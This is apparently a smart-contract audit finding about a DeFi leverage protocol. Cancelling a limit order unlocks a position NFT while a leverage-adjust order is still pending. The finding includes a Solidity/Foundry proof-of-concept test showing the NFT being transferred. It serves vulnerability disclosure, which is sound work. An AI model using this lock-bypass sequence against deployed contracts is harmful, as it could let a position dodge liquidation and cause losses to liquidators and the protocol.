# NFT Can Be transferred During An Order Announcement

## Summary

NFTs can be transferred to another wallet in the mid of `announceOrder`

## Vulnerability Detail

`NFTs` are locked during order announcement in order to not allow users to transfer those tokens and are unlocked only after order execution

The behavior can be bypassed, consider this scenario:
1. Alice open a leverage position and executed(NFT minted with its id)
2. Alice now calls the `announceLimitOrder` of the LimitOrder.sol file and his nft is now locked
3. Alice invokes the `announceLeverageAdjust` function to adjust his position and in this case the NFT is locked also since it was locked already
4. Now alice calls the `cancelLimitOrder` of the LimitOrder.sol file and have his `NFT unlocked
5. In this case alice can transfer his token to another wallet of his choice

Here is a POC demonstrating the transfer of the token:

In your `OrerHelpers.sol`:
```solidity
 function announceAndExecuteLeverageOpen(
        address traderAccount,
        address keeperAccount,
        uint256 margin,
        uint256 additionalSize,
        uint256 oraclePrice,
        uint256 keeperFeeAmount
    ) public virtual returns (uint256 tokenId) {
        announceOpenLeverage(traderAccount, margin, additionalSize, keeperFeeAmount);

        skip(uint256(vaultProxy.minExecutabilityAge())); // must reach minimum executability time

        int256 fundingRateBefore = vaultProxy.getCurrentFundingRate();

        tokenId = executeOpenLeverage(keeperAccount, traderAccount, oraclePrice);

        assertEq(
            vaultProxy.getCurrentFundingRate(),
            fundingRateBefore,
            "Funding rate should not change immediately after adjustment"
        );
    }
```
in your `AdjustPosition.t.sol` :
```solidity
function test_transfer_while_token_is_supposed_to_be_locked() public {
        vm.startPrank(alice);

        uint256 stableDeposit = 100e18;
        uint256 collateralPrice = 1000e8;

        announceAndExecuteDeposit({
            traderAccount: alice,
            keeperAccount: keeper,
            depositAmount: stableDeposit,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });

        // Announce and execute Leverage open order and have the NFt minted(with its id)
        uint256 tokenId = announceAndExecuteLeverageOpen({
            traderAccount: alice,
            keeperAccount: keeper,
            margin: 10e18,
            additionalSize: 30e18,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });

        vm.prank(alice);
        // Announce a limit order and NFT locked
        limitOrderProxy.announceLimitOrder({tokenId: tokenId, priceLowerThreshold: 900e18, priceUpperThreshold: 1100e18});

        // Announce leverage adjsut order   after the limit order annouce: NFT is already locked here, so no issue
        announceAdjustLeverage(alice, tokenId, 10e18, 30e18, 0);

        vm.prank(alice);

        // Alice calls the cancel limit order to cancel and unlocked his NFT .
        limitOrderProxy.cancelLimitOrder(tokenId);

        // Now alice transfer the NFT to bob while the adjust order is still in place and active
        vm.prank(alice);
        leverageModProxy.approve(bob, tokenId);

        // bob transfer to himself via transferFrom
        vm.prank(bob);
        leverageModProxy.transferFrom(alice, bob, tokenId);
    }
```

## Impact
1. The impact here is that Alice was able to transfer his `NFT` to another wallet while still having his `announceLeverageAdjust` active, this can allow him to submit another order and overwrite the mapping with the new wallet
2. Another impact is that , he can adjust his  large position that should be liquidated  to a small position amount by calling the adjust function with very small amount potentially overwriting the mapping, this will make him loss and also the liquidator, and this makes his that large account unliquidatable because it no longer exist in the mapping that get called during liquidation(`getPosition`); this is high as there will be loss of funds

## Recommendation

Make sure that the the code is able to differentiate the LimitOrder and normal order in terms of Locking and Unlocking of `NFTs`
